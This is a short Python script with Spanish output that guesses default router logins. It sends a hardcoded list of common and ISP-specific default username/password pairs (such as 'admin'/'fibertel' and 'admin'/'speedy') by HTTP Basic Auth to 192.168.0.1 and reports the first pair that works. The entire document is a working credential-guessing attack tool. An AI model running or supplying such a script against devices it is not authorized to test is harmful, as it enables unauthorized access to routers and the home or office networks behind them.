import requests
from requests.auth import HTTPBasicAuth

url = "http://192.168.0.1/"

credenciales = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "fibertel"),
    ("admin", "telecom"),
    ("admin", "speedy"),
    ("admin", ""),
    ("root", "root"),
    ("user", "user"),
    ("user", "password"),
    ("admin", "admin1234")
]

print("[*] Iniciando prueba de credenciales en el router...")

for usuario, password in credenciales:
    try:
        response = requests.get(url, auth=HTTPBasicAuth(usuario, password), timeout=3)
        if response.status_code == 200:
            print(f"\n[¡ÉXITO!] ¡Credenciales encontradas!")
            print(f"Usuario: {usuario}")
            print(f"Contraseña: {password}")
            break
        else:
            print(f"[-] Probando: {usuario} / {password if password else '(vacía)'} -> Falló")
    except Exception as e:
        print(f"[!] Error de conexión con {usuario}: {e}")

print("\n[*] Escaneo finalizado.")
